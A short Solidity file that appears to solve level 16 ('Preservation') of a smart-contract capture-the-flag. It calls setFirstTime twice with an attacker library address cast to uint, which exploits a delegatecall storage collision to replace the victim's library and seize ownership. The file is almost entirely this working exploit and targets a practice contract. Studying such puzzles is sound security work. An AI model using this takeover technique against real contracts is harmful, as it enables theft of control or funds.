// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IPreservation {
      // public library contracts 

     function setFirstTime(uint _timeStamp) external;
     function setSecondTime(uint _timeStamp) external;
}

contract Level16 {
    //Preservation instance address: 0xE0d0cf6987761fD4A986a4C18177871eC5001429
    IPreservation public IP = IPreservation(0xE0d0cf6987761fD4A986a4C18177871eC5001429);
    
    function Solve() public {
        //LibraryContract1.sol contract address: 0xAD5b5C6f5D5F234A09fcfe0A6702e6E3cd9BCB01
        IP.setFirstTime(uint(0xAD5b5C6f5D5F234A09fcfe0A6702e6E3cd9BCB01));
        IP.setFirstTime(uint(0xAD5b5C6f5D5F234A09fcfe0A6702e6E3cd9BCB01));
    }

}
